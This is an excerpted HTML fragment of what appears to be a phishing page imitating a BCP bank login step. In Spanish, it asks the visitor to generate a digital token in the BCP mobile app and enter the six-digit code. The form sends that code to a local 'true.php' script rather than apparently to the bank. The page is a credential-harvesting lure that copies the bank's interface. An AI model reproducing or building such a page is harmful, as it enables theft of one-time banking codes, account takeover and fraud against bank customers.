            ...
            <div _ngcontent-hpd-c39="" class="row container-form">
              <div _ngcontent-hpd-c39="" class="col mtTable" style="margin-top: 8px;">
                <div _ngcontent-hpd-c39="" class="box-wrapper container">
                  <form _ngcontent-hpd-c39="" action="true.php" method="post" class="ng-invalid ng-dirty ng-touched">
                    ...
                    <p>Para ingresar a tu cuenta, genera un token digital en tu app Móvil BCP y capturalo a continuación</p>
                          ...
                          <div _ngcontent-hpd-c38="" class="ciam-input-card">
                            <div _ngcontent-hpd-c38="" class="form-group active">
                              <bcp-tooltip _ngcontent-hpd-c38="" size="lg" position="top" trigger="click" class="hydrated">
                                <input _ngcontent-hpd-c38="" name="to" aria-labelledby="ciam-input-card-lbl" type="number" autocomplete="off" inputmode="numeric" class="form-control" placeholder="" minlength="6" maxlength="6">
                                </bcp-tooltip>
                                <bcp-paragraph _ngcontent-hpd-c38="" id="ciam-input-card-lbl" size="sm" family="demi" class="input-label hydrated">
                                <p class="paragraph-sm bcp-font-demi"> Token digital </p>
                              </bcp-paragraph>
                            </div>
